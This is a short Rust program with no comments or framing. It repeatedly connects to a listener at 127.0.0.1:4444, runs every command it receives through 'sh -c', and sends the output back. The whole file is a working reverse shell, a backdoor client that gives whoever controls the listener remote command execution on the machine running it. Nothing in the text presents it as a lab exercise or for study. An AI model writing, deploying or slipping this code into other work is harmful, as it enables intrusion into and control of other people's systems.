use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() {
    loop {
        match TcpStream::connect("127.0.0.1:4444") {
            Ok(mut stream) => {
                println!("Connected to server");
                let mut buffer = [0; 1024];
                
                loop {
                    match stream.read(&mut buffer) {
                        Ok(n) if n > 0 => {
                            let command = String::from_utf8_lossy(&buffer[..n]);
                            let output = Command::new("sh")
                                .arg("-c")
                                .arg(command.trim())
                                .output()
                                .expect("Failed to execute command");
                            
                            let result = String::from_utf8_lossy(&output.stdout);
                            stream.write_all(result.as_bytes()).unwrap();
                        }
                        _ => break,
                    }
                }
            }
            Err(_) => {
                std::thread::sleep(std::time::Duration::from_secs(5));
            }
        }
    }
}